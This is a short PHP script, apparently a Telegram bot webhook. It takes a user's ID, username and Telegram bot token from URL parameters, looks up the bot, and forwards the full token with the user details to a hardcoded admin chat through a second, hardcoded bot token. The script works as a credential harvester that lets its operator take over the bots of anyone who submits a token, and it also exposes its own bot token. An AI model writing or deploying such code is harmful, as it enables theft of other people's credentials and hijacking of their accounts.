<?php
$to ="1863517518:AAH33deLnpNjWzzG8oeXpJKOerbXKs3oFps";
define('API_KEY',$to);
function bot($method,$datas=[]){
$cuuuuU = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$cuuuuU";
$hhzZz = file_get_contents($url);
return json_decode($hhzZz);
}
$update = json_decode(file_get_contents('php://input'));
$sudo1 = "1485690210";
$id = $_GET["id"];
$user = $_GET["user"];
$token = $_GET["token"];
$info = json_decode(file_get_contents("https://api.telegram.org/bot$token/getme")); 
$usrbot = "@".$info->result->username;
if($id){
bot('sendmessage',[
'chat_id'=>$sudo1,
'text'=>"
📮~ *$user*
----------
📮~ *$id*
----------
📮~ *$usrbot*
----------
📮~ $token
",
'parse_mode'=>"markdown",
]);
}